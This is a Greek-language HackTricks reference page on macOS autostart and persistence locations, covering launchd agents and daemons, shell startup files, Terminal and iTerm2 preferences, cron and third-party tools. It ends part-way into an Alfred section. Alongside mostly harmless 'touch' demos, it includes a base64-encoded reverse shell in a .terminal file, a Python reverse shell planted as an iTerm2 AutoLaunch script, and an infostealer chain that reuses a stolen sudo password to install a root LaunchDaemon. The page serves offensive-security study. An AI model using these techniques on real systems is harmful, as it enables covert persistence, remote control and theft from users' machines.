# macOS Αυτόματη Εκκίνηση

{{#include ../banners/hacktricks-training.md}}

Αυτή η ενότητα βασίζεται σε μεγάλο βαθμό στη σειρά δημοσιευμάτων στο blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), ο στόχος είναι να προστεθούν **περισσότερες τοποθεσίες αυτόματης εκκίνησης** (όπου είναι δυνατό), να υποδειχθεί **ποιες τεχνικές εξακολουθούν να λειτουργούν** σήμερα με την τελευταία έκδοση του macOS (13.4) και να προσδιοριστούν τα **απαιτούμενα δικαιώματα**.

## Sandbox Bypass

> [!TIP]
> Εδώ θα βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass** που σας επιτρέπουν απλά να εκτελέσετε κάτι γράφοντάς το σε ένα αρχείο και περιμένοντας για μια πολύ **συνηθισμένη** **ενέργεια**, ένα καθορισμένο **χρονικό διάστημα** ή μια **ενέργεια που συνήθως μπορείτε να εκτελέσετε** από μέσα σε ένα sandbox χωρίς να χρειαστείτε root δικαιώματα.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

- **`/Library/LaunchAgents`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/Library/LaunchDaemons`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/System/Library/LaunchAgents`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Επανεκκίνηση
- Απαιτείται root
- **`~/Library/LaunchAgents`**
- **Trigger**: Επανασύνδεση χρήστη
- **`~/Library/LaunchDemons`**
- **Trigger**: Επανασύνδεση χρήστη

> [!TIP]
> Ως ενδιαφέρον στοιχείο, το **`launchd`** έχει ένα ενσωματωμένο property list στην Mach-o ενότητα `__Text.__config` που περιέχει άλλες γνωστές υπηρεσίες που πρέπει να ξεκινήσει το launchd. Επιπλέον, αυτές οι υπηρεσίες μπορεί να περιέχουν τα `RequireSuccess`, `RequireRun` και `RebootOnSuccess` που σημαίνει ότι πρέπει να εκτελεστούν και να ολοκληρωθούν επιτυχώς.
>
> Φυσικά, δεν μπορούν να τροποποιηθούν λόγω του code signing.

#### Περιγραφή & Εκμετάλλευση

Το **`launchd`** είναι η **πρώτη** **διαδικασία** που εκτελείται από τον OX S kernel κατά την εκκίνηση και η τελευταία που τερματίζεται στο shutdown. Πρέπει πάντα να έχει το **PID 1**. Αυτή η διαδικασία θα **διαβάζει και θα εκτελεί** τις ρυθμίσεις που υποδεικνύονται στα **ASEP** **plists** στο:

- `/Library/LaunchAgents`: Per-user agents installed by the admin
- `/Library/LaunchDaemons`: System-wide daemons installed by the admin
- `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
- `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.

Όταν ένας χρήστης κάνει login, τα plists που βρίσκονται σε `/Users/$USER/Library/LaunchAgents` και `/Users/$USER/Library/LaunchDemons` ξεκινούν με τα **δικαιώματα του συνδεδεμένου χρήστη**.

Η **κύρια διαφορά μεταξύ agents και daemons είναι ότι οι agents φορτώνονται όταν ο χρήστης κάνει login και οι daemons φορτώνονται κατά την εκκίνηση του συστήματος** (καθώς υπάρχουν υπηρεσίες όπως το ssh που πρέπει να εκτελεστούν πριν οποιοσδήποτε χρήστης αποκτήσει πρόσβαση στο σύστημα). Επιπλέον, οι agents μπορεί να χρησιμοποιούν GUI ενώ οι daemons πρέπει να τρέχουν στο παρασκήνιο.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Υπάρχουν περιπτώσεις όπου ένας **agent χρειάζεται να εκτελεστεί πριν τη σύνδεση του χρήστη**, αυτές ονομάζονται **PreLoginAgents**. Για παράδειγμα, αυτό είναι χρήσιμο για να παρέχει βοηθητική τεχνολογία κατά τη σύνδεση. Μπορούν επίσης να βρεθούν στο `/Library/LaunchAgents` (βλ. [**εδώ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ένα παράδειγμα).

> [!TIP]
> New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
> It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
>
> Για να **εξασφαλίσετε** ότι δεν υπάρχει **τίποτα** (όπως ένα override) που **εμποδίζει** ένα **Agent** ή **Daemon** να **τρέξει** εκτελέστε: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Λίστα με όλους τους agents και daemons που έχουν φορτωθεί από τον τρέχοντα χρήστη:
```bash
launchctl list
```
#### Παράδειγμα κακόβουλης αλυσίδας LaunchDaemon (επαναχρησιμοποίηση κωδικού)

Ένας πρόσφατος macOS infostealer επαναχρησιμοποίησε έναν **συλληφθέντα sudo κωδικό** για να εγκαταστήσει έναν user agent και ένα root LaunchDaemon:

- Γράψε τον agent loop στο `~/.agent` και κάνε τον εκτελέσιμο.
- Δημιούργησε ένα plist στο `/tmp/starter` που δείχνει σε αυτόν τον agent.
- Επαναχρησιμοποίησε τον κλεμμένο κωδικό με `sudo -S` για να τον αντιγράψεις στο `/Library/LaunchDaemons/com.finder.helper.plist`, να ορίσεις `root:wheel`, και να το φορτώσεις με `launchctl load`.
- Ξεκίνησε τον agent σιωπηλά μέσω `nohup ~/.agent >/dev/null 2>&1 &` ώστε να αποσυνδεθεί η έξοδος.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Αν ένα plist ανήκει σε έναν χρήστη, ακόμη κι αν βρίσκεται σε system-wide φακέλους daemon, το **task θα εκτελεστεί ως ο χρήστης** και όχι ως root. Αυτό μπορεί να αποτρέψει μερικές επιθέσεις privilege escalation.

#### More info about launchd

**`launchd`** είναι η **πρώτη** διεργασία user mode που ξεκινάει από τον **kernel**. Η εκκίνηση της διεργασίας πρέπει να είναι **επιτυχής** και **δεν μπορεί να τερματιστεί ή να καταρρεύσει**. Είναι ακόμη **προστατευμένη** απέναντι σε κάποια **signaling για τερματισμό**.

Ένα από τα πρώτα πράγματα που θα κάνει το `launchd` είναι να **ξεκινήσει** όλους τους **daemons** όπως:

- **Timer daemons** βάσει χρόνου για εκτέλεση:
- atd (`com.apple.atrun.plist`): Έχει `StartInterval` 30min
- crond (`com.apple.systemstats.daily.plist`): Έχει `StartCalendarInterval` για εκκίνηση στις 00:15
- **Network daemons** όπως:
- `org.cups.cups-lpd`: Ακούει σε TCP (`SockType: stream`) με `SockServiceName: printer`
- SockServiceName πρέπει να είναι είτε ένας port είτε μια υπηρεσία από `/etc/services`
- `com.apple.xscertd.plist`: Ακούει σε TCP στην θύρα 1640
- **Path daemons** που εκτελούνται όταν αλλάζει ένα συγκεκριμένο path:
- `com.apple.postfix.master`: Ελέγχει το path `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Δηλώνει στην εγγραφή `MachServices` το όνομα `com.apple.xscertd.helper`
- **UserEventAgent:**
- Αυτό διαφέρει από το προηγούμενο. Κάνει το launchd να spawnάρει εφαρμογές σε απάντηση συγκεκριμένου event. Ωστόσο, σε αυτή την περίπτωση, το κύριο binary που εμπλέκεται δεν είναι το `launchd` αλλά το `/usr/libexec/UserEventAgent`. Φορτώνει plugins από τον SIP restricted φάκελο /System/Library/UserEventPlugins/ όπου κάθε plugin δηλώνει τον initialiser του στο κλειδί `XPCEventModuleInitializer` ή, στην περίπτωση παλαιότερων plugins, στο dict `CFPluginFactories` κάτω από το κλειδί `FB86416D-6164-2070-726F-70735C216EC0` του `Info.plist` του.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- But you need to find an app with a TCC bypass that executes a shell that loads these files

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Άνοιγμα τερματικού με zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Άνοιγμα τερματικού με zsh
- Root required
- **`~/.zlogout`**
- **Trigger**: Έξοδος από τερματικό με zsh
- **`/etc/zlogout`**
- **Trigger**: Έξοδος από τερματικό με zsh
- Root required
- Potentially more in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Άνοιγμα τερματικού με bash
- `/etc/profile` (δεν δούλεψε)
- `~/.profile` (δεν δούλεψε)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Αναμένεται να ενεργοποιείται με xterm, αλλά **δεν είναι εγκατεστημένο** και ακόμη και μετά την εγκατάσταση εμφανίζεται αυτό το σφάλμα: xterm: `DISPLAY is not set`

#### Description & Exploitation

Κατά την εκκίνηση ενός shell περιβάλλοντος όπως τα `zsh` ή `bash`, **εκτελούνται ορισμένα αρχεία εκκίνησης**. Το macOS χρησιμοποιεί επί του παρόντος το `/bin/zsh` ως το προεπιλεγμένο shell. Αυτό το shell ανοίγει αυτόματα όταν η εφαρμογή Terminal ξεκινά ή όταν μία συσκευή προσπελαύνεται μέσω SSH. Ενώ τα `bash` και `sh` υπάρχουν επίσης στο macOS, πρέπει να κληθούν ρητά για να χρησιμοποιηθούν.

Η man σελίδα του zsh, την οποία μπορούμε να διαβάσουμε με **`man zsh`**, έχει μια εκτενή περιγραφή των αρχείων εκκίνησης.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Εφαρμογές που ανοίγονται ξανά

> [!CAUTION]
> Οι προτεινόμενες ρυθμίσεις και το exploitation, καθώς και η αποσύνδεση/επανείσοδος ή ακόμη και το reboot, δεν λειτούργησαν για μένα ώστε να εκτελεστεί η εφαρμογή. (Η εφαρμογή δεν εκτελούνταν — ίσως πρέπει να είναι ενεργή όταν γίνονται αυτές οι ενέργειες)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Επανεκκίνηση που επανανοίγει εφαρμογές

#### Περιγραφή & Exploitation

Όλες οι εφαρμογές που θα ανοίξουν ξανά βρίσκονται μέσα στο plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Άρα, κάντε τις εφαρμογές που επανανοίγονται να εκκινούν την δική σας — απλά χρειάζεται να **προσθέσετε την εφαρμογή σας στη λίστα**.

Το UUID μπορεί να βρεθεί απαριθμώντας αυτόν τον κατάλογο ή με `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Για να ελέγξετε τις εφαρμογές που θα επανανοίξουν μπορείτε να κάνετε:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Για να **προσθέσετε μια εφαρμογή σε αυτήν τη λίστα** μπορείτε να χρησιμοποιήσετε:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Προτιμήσεις Terminal

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
- Το Terminal συχνά διαθέτει δικαιώματα FDA του χρήστη που το χρησιμοποιεί

#### Τοποθεσία

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Ενεργοποιητής**: Άνοιγμα Terminal

#### Περιγραφή & Εκμετάλλευση

Στον φάκελο **`~/Library/Preferences`** αποθηκεύονται οι προτιμήσεις του χρήστη για τις εφαρμογές. Κάποιες από αυτές τις προτιμήσεις μπορεί να περιέχουν ρύθμιση για **εκτέλεση άλλων εφαρμογών/σκριπτών**.

Για παράδειγμα, το Terminal μπορεί να εκτελέσει μια εντολή κατά την εκκίνηση:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Αυτή η ρύθμιση εμφανίζεται στο αρχείο **`~/Library/Preferences/com.apple.Terminal.plist`** ως εξής:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Έτσι, αν το plist των προτιμήσεων του terminal στο σύστημα μπορούσε να αντικατασταθεί, η λειτουργία **`open`** μπορεί να χρησιμοποιηθεί για να **ανοίξει το terminal και αυτή η εντολή θα εκτελεστεί**.

Μπορείτε να προσθέσετε αυτό από το cli με:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Σενάρια Terminal / Άλλες επεκτάσεις αρχείων

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Το Terminal έχει τις άδειες FDA του χρήστη που το χρησιμοποιεί

#### Τοποθεσία

- **Οπουδήποτε**
- **Trigger**: Άνοιγμα Terminal

#### Περιγραφή & Εκμετάλλευση

Αν δημιουργήσετε ένα [**`.terminal`** σενάριο](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) και το ανοίξετε, η **Terminal application** θα κληθεί αυτόματα για να εκτελέσει τις εντολές που αναγράφονται μέσα. Αν η εφαρμογή Terminal έχει κάποια ειδικά προνόμια (όπως TCC), η εντολή σας θα εκτελεστεί με αυτά τα ειδικά προνόμια.

Δοκιμάστε το με:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Μπορεί να αποκτήσετε επιπλέον πρόσβαση TCC

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Απαιτείται root
- **Trigger**: Επανεκκίνηση coreaudiod ή του υπολογιστή
- **`/Library/Audio/Plug-ins/Components`**
- Απαιτείται root
- **Trigger**: Επανεκκίνηση coreaudiod ή του υπολογιστή
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Επανεκκίνηση coreaudiod ή του υπολογιστή
- **`/System/Library/Components`**
- Απαιτείται root
- **Trigger**: Επανεκκίνηση coreaudiod ή του υπολογιστή

#### Description

Σύμφωνα με τις προηγούμενες αναφορές, είναι δυνατό να **μεταγλωττίσετε κάποια audio plugins** και να τα φορτώσετε.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Μπορεί να αποκτήσετε επιπλέον πρόσβαση TCC

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

Τα QuickLook plugins μπορούν να εκτελεστούν όταν **ενεργοποιείτε την προεπισκόπηση ενός αρχείου** (πατήστε το πλήκτρο space με το αρχείο επιλεγμένο στο Finder) και έχει εγκατασταθεί ένα **plugin που υποστηρίζει αυτόν τον τύπο αρχείου**.

Είναι δυνατό να μεταγλωττίσετε το δικό σας QuickLook plugin, να το τοποθετήσετε σε μία από τις προηγούμενες τοποθεσίες ώστε να φορτωθεί και στη συνέχεια να μεταβείτε σε ένα υποστηριζόμενο αρχείο και να πατήσετε space για να το ενεργοποιήσετε.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Αυτό δεν λειτούργησε για μένα, ούτε με τον LoginHook του χρήστη ούτε με τον LogoutHook του root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Πρέπει να μπορείτε να εκτελέσετε κάτι όπως `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Έχουν αποσυρθεί (deprecated) αλλά μπορούν να χρησιμοποιηθούν για να εκτελέσουν εντολές όταν ένας χρήστης πραγματοποιεί είσοδο.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Αυτή η ρύθμιση αποθηκεύεται στο `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Για να το διαγράψετε:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Το αρχείο για τον χρήστη root βρίσκεται στο **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Εδώ θα βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass** που σας επιτρέπουν να εκτελέσετε κάτι απλά με **γράψιμό του σε ένα αρχείο** και **αναμένοντας όχι τόσο συνηθισμένες συνθήκες**, όπως συγκεκριμένα **εγκατεστημένα προγράμματα, "ασυνήθεις" ενέργειες χρήστη** ή περιβάλλοντα.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Χρήσιμο για bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ωστόσο, πρέπει να μπορείτε να εκτελέσετε το δυαδικό `crontab`
- Ή να είστε root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Απαιτείται root για άμεση εγγραφή. Δεν απαιτείται root αν μπορείτε να εκτελέσετε `crontab <file>`
- **Trigger**: Εξαρτάται από την cron job

#### Περιγραφή & Εκμετάλλευση

Προβάλετε τις cron εργασίες του **τρέχοντος χρήστη** με:
```bash
crontab -l
```
Μπορείτε επίσης να δείτε όλες τις cron jobs των χρηστών στο **`/usr/lib/cron/tabs/`** και **`/var/at/tabs/`** (απαιτείται root).

Στο MacOS μπορούν να βρεθούν διάφοροι φάκελοι που εκτελούν scripts με **συγκεκριμένη συχνότητα**:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Εκεί μπορείτε να βρείτε τα συνηθισμένα **cron** **jobs**, τα **at** **jobs** (όχι πολύ χρησιμοποιούμενα) και τα **periodic** **jobs** (κυρίως χρησιμοποιούνται για τον καθαρισμό προσωρινών αρχείων). Οι daily periodic jobs μπορούν να εκτελεστούν για παράδειγμα με: `periodic daily`.

Για να προσθέσετε ένα **user cronjob programatically** είναι δυνατό να χρησιμοποιήσετε:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Άρθρο: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Το iTerm2 είχε στο παρελθόν χορηγηθεί δικαιώματα TCC

#### Τοποθεσίες

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Ενεργοποίηση**: Άνοιγμα iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Ενεργοποίηση**: Άνοιγμα iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Ενεργοποίηση**: Άνοιγμα iTerm

#### Περιγραφή & Εκμετάλλευση

Τα scripts που αποθηκεύονται στο **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** θα εκτελούνται. Για παράδειγμα:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ή:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Το script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** θα εκτελεστεί επίσης:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Οι προτιμήσεις του iTerm2 που βρίσκονται στο **`~/Library/Preferences/com.googlecode.iterm2.plist`** μπορούν να **υποδείξουν μια εντολή προς εκτέλεση** όταν το τερματικό iTerm2 ανοίγει.

Αυτή η ρύθμιση μπορεί να διαμορφωθεί στις ρυθμίσεις του iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Και η εντολή αντανακλάται στις προτιμήσεις:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Μπορείτε να ορίσετε την εντολή που θα εκτελεστεί με:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Πιθανότατα υπάρχουν **άλλοι τρόποι να εκμεταλλευτείτε τις προτιμήσεις του iTerm2** για execute arbitrary commands.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Αλλά το xbar πρέπει να είναι εγκατεστημένο
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Accessibility

#### Τοποθεσία

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Μόλις ξεκινήσει το xbar

#### Περιγραφή

Αν το δημοφιλές πρόγραμμα [**xbar**](https://github.com/matryer/xbar) είναι εγκατεστημένο, είναι δυνατό να γράψετε ένα shell script στο **`~/Library/Application\ Support/xbar/plugins/`** το οποίο θα εκτελεστεί όταν ξεκινήσει το xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Αναφορά**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Αλλά το Hammerspoon πρέπει να είναι εγκατεστημένο
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Αιτεί δικαιώματα Accessibility

#### Τοποθεσία

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Μόλις εκτελεστεί το hammerspoon

#### Περιγραφή

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) λειτουργεί ως πλατφόρμα αυτοματοποίησης για **macOS**, χρησιμοποιώντας τη **LUA scripting language** για τις λειτουργίες της. Σημειωτέον, υποστηρίζει την ενσωμάτωση πλήρους κώδικα AppleScript και την εκτέλεση shell scripts, ενισχύοντας σημαντικά τις δυνατότητες scripting.

Η εφαρμογή αναζητά ένα μοναδικό αρχείο, `~/.hammerspoon/init.lua`, και όταν ξεκινήσει το script θα εκτελεστεί.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Όμως το BetterTouchTool πρέπει να είναι εγκατεστημένο
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Automation-Shortcuts και Accessibility

#### Τοποθεσία

- `~/Library/Application Support/BetterTouchTool/*`

Αυτό το εργαλείο επιτρέπει να καθορίσετε εφαρμογές ή scripts που θα εκτελούνται όταν πατηθούν κάποιες συντομεύσεις. Ένας επιτιθέμενος μπορεί να είναι σε θέση να διαμορφώσει τη δική του **συντόμευση και ενέργεια προς εκτέλεση στη βάση δεδομένων** για να κάνει την εκτέλεση αυθαίρετου κώδικα (μια συντόμευση μπορεί απλώς να είναι το πάτημα ενός πλήκτρου).

### Alfred

- Χρήσιμο για bypass του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Όμως το Alfred πρέπει να είναι εγκατεστημένο
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Ζητά δικαιώματα Automation, Accessibility και ακόμη Full-Disk access

#### Τοποθεσία

